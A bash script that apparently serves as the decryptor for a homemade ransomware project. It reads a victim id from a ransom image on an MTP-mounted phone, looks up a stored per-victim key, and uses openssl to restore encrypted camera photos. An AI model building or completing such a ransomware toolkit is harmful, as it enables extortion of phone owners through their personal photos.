#!/bin/bash
 ##############################################Here, the script reverses the encrypting script's effects.###########################################################################
PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/Camera)
LOCALPATH=$(pwd)

echo $PHONEPATH
cd "$PHONEPATH"
id=$(echo ransom_* | sed 's/ransom_\|\.png//g')
echo id is $id
cd "$LOCALPATH/fundamentals"
fundamental=$(cat fundamentals.txt | grep $id | cut -d \| -f 3 | sed 's/ //')
echo fundamental is $fundamental
echo ""
cd "$PHONEPATH"
newfile=1
filecounter=$(ls -1 | grep -v "ransom" | grep -v ".lol" | wc -l)
#################################################################################################################################################################################





###################################################Move to the local, decrypt, then return back. Local files should be removed############################################################
for f in *
do 
	
	if [[ "$f" = *".enc.jpg" ]]; then
		echo "Now decrypting $f ($newfile/$filecounter)..."
		gvfs-move "$f" "$LOCALPATH/data/decrypt"
		openssl aes-256-cbc -d -a -in "$LOCALPATH/data/decrypt/$f" -out "$LOCALPATH/data/decrypt/${f/.enc.jpg/}" -k "$fundamental" #Here this line remove the .enc.jpg extension from the output file.
		touch -r "$LOCALPATH/data/decrypt/$f" "$LOCALPATH/data/decrypt/${f/.enc.jpg/}" #transfer over same currenttime attributes
		
		gvfs-move "$LOCALPATH/data/decrypt/${f/.enc.jpg/}" .
		#rm "$LOCALPATH/data/decrypt/$f"
		
		newfile=$((newfile+1)) 
	fi
	
done
echo Ransom note is being deleted...
#rm "ransomnote.png"
echo YEY decryption is now sucessful!
echo "" 
#############################################################################################THE END#############################################################################